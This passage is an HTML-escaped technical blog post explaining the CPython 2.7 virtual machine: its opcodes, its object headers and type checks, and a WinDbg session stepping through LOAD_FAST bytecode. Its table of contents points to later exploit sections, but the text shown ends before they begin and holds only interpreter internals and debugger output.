&lt;li&gt;&lt;a href="#introduction_1"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-virtual-machine"&gt;The virtual machine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#everything-is-an-object"&gt;Everything is an object&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#debugging-session-stepping-the-vm-the-hard-way"&gt;Debugging session: stepping the VM. The hard way.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-bug"&gt;The bug&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#walking-through-the-poc"&gt;Walking through the PoC&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#pushing-attacker-controlled-data-on-the-virtual-stack"&gt;Pushing attacker-controlled data on the virtual stack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#game-over-load_function"&gt;Game over, LOAD_FUNCTION&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#conclusion-ideas"&gt;Conclusion, Ideas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="the-python-virtual-processor"&gt;The Python virtual processor&lt;/h1&gt;
&lt;h2 id="introduction_1"&gt;Introduction&lt;/h2&gt;
&lt;p&gt;As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: &lt;a href="http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz"&gt;Python-2.7.6.tgz&lt;/a&gt;. The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
Now all the Python code you write is being &lt;em&gt;compiled&lt;/em&gt;, at some point, into some "bytecodes": let's say it's exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.&lt;/p&gt;
&lt;p&gt;Here is a partial list of all available opcodes in Python 2.7.5:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [5]: len(opcode.opmap.keys())
Out[5]: 119
In [4]: opcode.opmap.keys()
Out[4]: [
 &amp;#39;CALL_FUNCTION&amp;#39;,
 &amp;#39;DUP_TOP&amp;#39;,
 &amp;#39;INPLACE_FLOOR_DIVIDE&amp;#39;,
 &amp;#39;MAP_ADD&amp;#39;,
 &amp;#39;BINARY_XOR&amp;#39;,
 &amp;#39;END_FINALLY&amp;#39;,
 &amp;#39;RETURN_VALUE&amp;#39;,
 &amp;#39;POP_BLOCK&amp;#39;,
 &amp;#39;SETUP_LOOP&amp;#39;,
 &amp;#39;BUILD_SET&amp;#39;,
 &amp;#39;POP_TOP&amp;#39;,
 &amp;#39;EXTENDED_ARG&amp;#39;,
 &amp;#39;SETUP_FINALLY&amp;#39;,
 &amp;#39;INPLACE_TRUE_DIVIDE&amp;#39;,
 &amp;#39;CALL_FUNCTION_KW&amp;#39;,
 &amp;#39;INPLACE_AND&amp;#39;,
 &amp;#39;SETUP_EXCEPT&amp;#39;,
 &amp;#39;STORE_NAME&amp;#39;,
 &amp;#39;IMPORT_NAME&amp;#39;,
 &amp;#39;LOAD_GLOBAL&amp;#39;,
 &amp;#39;LOAD_NAME&amp;#39;,
 ...
]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id="the-virtual-machine"&gt;The virtual machine&lt;/h2&gt;
&lt;p&gt;The Python VM is fully implemented in the function &lt;a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667"&gt;PyEval_EvalFrameEx&lt;/a&gt; that you can find in the &lt;a href="https://github.com/python-git/python/blob/master/Python/ceval.c"&gt;ceval.c&lt;/a&gt; file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="nf"&gt;PyEval_EvalFrameEx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyFrameObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;throwflag&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;//...&lt;/span&gt;
  &lt;span class="nl"&gt;fast_next_opcode&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="c1"&gt;//...&lt;/span&gt;
  &lt;span class="cm"&gt;/* Extract opcode and argument */&lt;/span&gt;
  &lt;span class="n"&gt;opcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NEXTOP&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;oparg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HAS_ARG&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;oparg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NEXTARG&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="c1"&gt;//...&lt;/span&gt;
  &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;NOP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;fast_next_opcode&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;LOAD_FAST&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GETLOCAL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Py_INCREF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;PUSH&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;fast_next_opcode&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="n"&gt;format_exc_check_arg&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyExc_UnboundLocalError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;UNBOUNDLOCAL_ERROR_MSG&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;PyTuple_GetItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;co&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;co_varnames&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
      &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;LOAD_CONST&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GETITEM&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;consts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;Py_INCREF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;PUSH&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;fast_next_opcode&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;STORE_FAST&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;POP&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="n"&gt;SETLOCAL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;fast_next_opcode&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="c1"&gt;//...&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.&lt;/p&gt;
&lt;h2 id="everything-is-an-object"&gt;Everything is an object&lt;/h2&gt;
&lt;p&gt;The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The first one is a header, this header is mandatory for all the objects. Defined like that:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define PyObject_HEAD                   \&lt;/span&gt;
&lt;span class="cp"&gt;  _PyObject_HEAD_EXTRA                \&lt;/span&gt;
&lt;span class="cp"&gt;  Py_ssize_t ob_refcnt;               \&lt;/span&gt;
&lt;span class="cp"&gt;  struct _typeobject *ob_type;&lt;/span&gt;

&lt;span class="cp"&gt;#define PyObject_VAR_HEAD               \&lt;/span&gt;
&lt;span class="cp"&gt;  PyObject_HEAD                       \&lt;/span&gt;
&lt;span class="cp"&gt;  Py_ssize_t ob_size; &lt;/span&gt;&lt;span class="cm"&gt;/* Number of items in variable part */&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The second one is the variable part that describes the specifics of your object. Here is for example &lt;em&gt;PyStringObject&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;PyObject_VAR_HEAD&lt;/span&gt;
  &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;ob_shash&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ob_sstate&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;ob_sval&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="cm"&gt;/* Invariants:&lt;/span&gt;
&lt;span class="cm"&gt;   *     ob_sval contains space for &amp;#39;ob_size+1&amp;#39; elements.&lt;/span&gt;
&lt;span class="cm"&gt;   *     ob_sval[ob_size] == 0.&lt;/span&gt;
&lt;span class="cm"&gt;   *     ob_shash is the hash of the string or -1 if not computed yet.&lt;/span&gt;
&lt;span class="cm"&gt;   *     ob_sstate != 0 iff the string object is in stringobject.c&amp;#39;s&lt;/span&gt;
&lt;span class="cm"&gt;   *       &amp;#39;interned&amp;#39; dictionary; in this case the two references&lt;/span&gt;
&lt;span class="cm"&gt;   *       from &amp;#39;interned&amp;#39; to this object are *not counted* in ob_refcnt.&lt;/span&gt;
&lt;span class="cm"&gt;   */&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;PyStringObject&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now, some of you may ask themselves "How does Python know the type of an object when it receives a pointer ?". In fact, this is exactly the role of the field &lt;em&gt;ob_type&lt;/em&gt;. Python exports a &lt;em&gt;_typeobject&lt;/em&gt; static variable that describes the type of the object. Here is, for instance the &lt;em&gt;PyString_Type&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;PyTypeObject&lt;/span&gt; &lt;span class="n"&gt;PyString_Type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;PyVarObject_HEAD_INIT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;PyType_Type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="s"&gt;&amp;quot;str&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;PyStringObject_SIZE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
  &lt;span class="n"&gt;string_dealloc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;                             &lt;span class="cm"&gt;/* tp_dealloc */&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;printfunc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;string_print&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;                    &lt;span class="cm"&gt;/* tp_print */&lt;/span&gt;
  &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;                                          &lt;span class="cm"&gt;/* tp_getattr */&lt;/span&gt;
  &lt;span class="c1"&gt;// ...&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basically, every string objects will have their &lt;em&gt;ob_type&lt;/em&gt; fields pointing to that &lt;em&gt;PyString_Type&lt;/em&gt; variable. With this cute little trick, Python is able to do type checking like that:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define Py_TYPE(ob)             (((PyObject*)(ob))-&amp;gt;ob_type)&lt;/span&gt;
&lt;span class="cp"&gt;#define PyType_HasFeature(t,f)  (((t)-&amp;gt;tp_flags &amp;amp; (f)) != 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)&lt;/span&gt;

&lt;span class="cp"&gt;#define PyString_Check(op) \&lt;/span&gt;
&lt;span class="cp"&gt;  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)&lt;/span&gt;

&lt;span class="cp"&gt;#define PyString_CheckExact(op) (Py_TYPE(op) == &amp;amp;PyString_Type)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;With the previous tricks, and the &lt;em&gt;PyObject&lt;/em&gt; type defined as follow, Python is able to handle in a generic-fashion the different objects:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;_object&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;PyObject_HEAD&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;PyObject&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; dps 026233b0 l2
026233b0  00000001
026233b4  1e226798 python27!PyString_Type
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Once you have done that, you can dump the variable part describing your object to extract the information you want.
By the way, all the native objects are implemented in the &lt;a href="https://github.com/python-git/python/tree/master/Objects"&gt;Objects/&lt;/a&gt; directory.&lt;/p&gt;
&lt;h3 id="debugging-session-stepping-the-vm-the-hard-way"&gt;Debugging session: stepping the VM. The hard way.&lt;/h3&gt;
&lt;p&gt;It's time for us to go a little bit deeper, at the assembly level, where we belong ; so let's define a dummy function like this one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;a&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now using the Python's &lt;a href="http://docs.python.org/2/library/dis.html"&gt;dis&lt;/a&gt; module, we can disassemble the function object &lt;em&gt;a&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [20]: dis.dis(a)
2   0 LOAD_FAST                0 (b)
    3 LOAD_FAST                1 (c)
    6 BINARY_ADD
    7 RETURN_VALUE
In [21]: a.func_code.co_code
In [22]: print &amp;#39;&amp;#39;.join(&amp;#39;\\x%.2x&amp;#39; % ord(i) for i in a.__code__.co_code)
\x7c\x00\x00\x7c\x01\x00\x17\x53

In [23]: opcode.opname[0x7c]
Out[23]: &amp;#39;LOAD_FAST&amp;#39;
In [24]: opcode.opname[0x17]
Out[24]: &amp;#39;BINARY_ADD&amp;#39;
In [25]: opcode.opname[0x53]
Out[25]: &amp;#39;RETURN_VALUE&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;PyObject_HEAD&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="cm"&gt;/* A code object */&lt;/span&gt;
  &lt;span class="c1"&gt;// ...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;PyFunctionObject&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cm"&gt;/* Bytecode object */&lt;/span&gt;
&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;PyObject_HEAD&lt;/span&gt;
    &lt;span class="c1"&gt;//...&lt;/span&gt;
    &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;co_code&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;    &lt;span class="cm"&gt;/* instruction opcodes */&lt;/span&gt;
    &lt;span class="c1"&gt;//...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;PyCodeObject&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Time to attach my debugger to the interpreter to see what's going on in that weird-machine, and to place a conditional breakpoint on &lt;a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667"&gt;PyEval_EvalFrameEx&lt;/a&gt;.
Once you did that, you can call the dummy function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; bp python27!PyEval_EvalFrameEx+0x2b2 &amp;quot;.if(poi(ecx+4) == 0x53170001){}.else{g}&amp;quot;
breakpoint 0 redefined
0:000&amp;gt; g
eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c

0:000&amp;gt; db ecx l8
025ea914  7c 00 00 7c 01 00 17 53                          |..|...S
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;OK perfect, we are in the middle of the VM, and our function is being evaluated. The register &lt;em&gt;ECX&lt;/em&gt; points to the bytecode being evaluated, and the first opcode is &lt;em&gt;LOAD_FAST&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Basically, this opcode takes an object in the &lt;em&gt;fastlocals&lt;/em&gt; array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument &lt;em&gt;b&lt;/em&gt;), then the index 1 (argument &lt;em&gt;c&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Here's what it looks like in the debugger ; first step is to load the &lt;em&gt;LOAD_FAST&lt;/em&gt; opcode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt;
eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In &lt;em&gt;ECX&lt;/em&gt; we have a pointer onto the opcodes of the function being evaluated, our dummy function. &lt;em&gt;0x7c&lt;/em&gt; is the value of the &lt;em&gt;LOAD_FAST&lt;/em&gt; opcode as we can see:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define LOAD_FAST 124 &lt;/span&gt;&lt;span class="cm"&gt;/* Local variable number */&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, the function needs to check if the opcode has argument or not, and that's done by comparing the opcode with a constant value called &lt;em&gt;HAVE_ARGUMENT&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt;
eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b8:
1e0ec568 83f85a          cmp     eax,5Ah
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Again, we can verify the value to be sure we understand what we are doing:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HAVE_ARGUMENT&lt;/span&gt;
&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;5a&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Definition of &lt;code&gt;HAS_ARG&lt;/code&gt; in C:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define HAS_ARG(op) ((op) &amp;gt;= HAVE_ARGUMENT)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If the opcode has an argument, the function needs to retrieve it (it's one byte):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt;
eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
python27!PyEval_EvalFrameEx+0x2c1:
1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As expected for the first &lt;em&gt;LOAD_FAST&lt;/em&gt; the argument is &lt;em&gt;0x00&lt;/em&gt;, perfect.
After that the function dispatches the execution flow to the &lt;em&gt;LOAD_FAST&lt;/em&gt; case defined as follow:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define GETLOCAL(i)     (fastlocals[i])&lt;/span&gt;
&lt;span class="cp"&gt;#define Py_INCREF(op) (                         \&lt;/span&gt;
&lt;span class="cp"&gt;    _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \&lt;/span&gt;
&lt;span class="cp"&gt;    ((PyObject*)(op))-&amp;gt;ob_refcnt++)&lt;/span&gt;
&lt;span class="cp"&gt;#define PUSH(v)                BASIC_PUSH(v)&lt;/span&gt;
&lt;span class="cp"&gt;#define BASIC_PUSH(v)     (*stack_pointer++ = (v))&lt;/span&gt;

&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;LOAD_FAST&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
